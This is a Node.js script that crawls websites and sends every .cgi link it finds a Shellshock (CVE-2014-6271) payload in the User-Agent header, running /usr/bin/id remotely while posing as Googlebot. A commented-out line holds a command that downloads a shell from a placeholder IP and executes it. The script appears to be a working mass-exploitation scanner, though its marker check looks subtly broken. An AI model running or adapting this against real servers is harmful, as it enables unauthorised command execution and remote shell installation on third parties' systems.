var util = require('util');
var request = require('request');
var async = require('async');
var select = require('soupselect').select;
var htmlparser = require("htmlparser");

var Crawler = require("crawler").Crawler;


var s = async.queue(function(link, cb) {
  console.log('scanner', link);
  var marker = 'my-cve6271-test';
  request({
    url: link,
    timeout: 3000,
    headers: {
      'Referrer': "http://www.google.com.hk/",
      'User-Agent': util.format("() { :;};echo %s$(/usr/bin/id)%s", marker)
      //'/usr/bin/wget xxx.xxx.xxx.xxx/shell1 -O /tmp/shell1 | /bin/chmod 777 /tmp/shell1 | /tmp/shell1" // download & execute shell
    }
  }, function(err, res, body) {
    var reg = new RegExp(marker + '\\d+' + marker);
    if (reg.test(body)) {
      console.log('vuln', link);
    }
  });
}, 5);


var c = new Crawler({
  maxConnections: 5,
  userAgent: 'Googlebot/2.1',
  timeout: 50000,
  callback: function(error,result,$) {
    if (error) {
      console.log('error', error);
      return;
    }

    // $ is a jQuery instance scoped to the server-side DOM of the page
    $("a").each(function(index,a) {
      try {
        if (/\.cgi/.test(a.href))
            s.push(a.href);

        c.queue(a.href);
      }catch(e) {
        console.error(e);
      }
    });
  }
});

module.exports = function(url) {
  console.log('enqueue', url);
  c.queue(url);
};

module.exports.scan = function(url) {
  s.push(url);
};



